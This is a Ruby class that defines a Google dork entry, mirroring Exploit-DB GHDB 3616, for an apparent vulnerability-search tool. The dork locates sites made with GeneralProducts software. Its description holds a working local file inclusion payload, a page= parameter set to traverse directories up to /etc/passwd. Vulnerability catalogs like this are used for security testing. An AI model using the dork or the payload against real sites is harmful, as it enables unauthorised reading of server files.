module Dorks
   class Dork3616 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3616",
            ghdb_url: "https://www.exploit-db.com/ghdb/3616",
            severity: "6",
            category: "advisories_and_vulnerabilities.lfi.generalproducts",
            publish_date: "2010-11-25",
            author: "anonymous",
            dork: <<~EDORK,
"Site produced by GeneralProducts.co.uk"
EDORK
            description: <<~EDESC
GeneralProducts (index.php?page=) Local File Inclusion Vulnerability http://server/index.php?page=../../../../../../etc/passwd Net.Edit0r - black.hat.tm@gmail.com
EDESC
         })

      end
   end
end
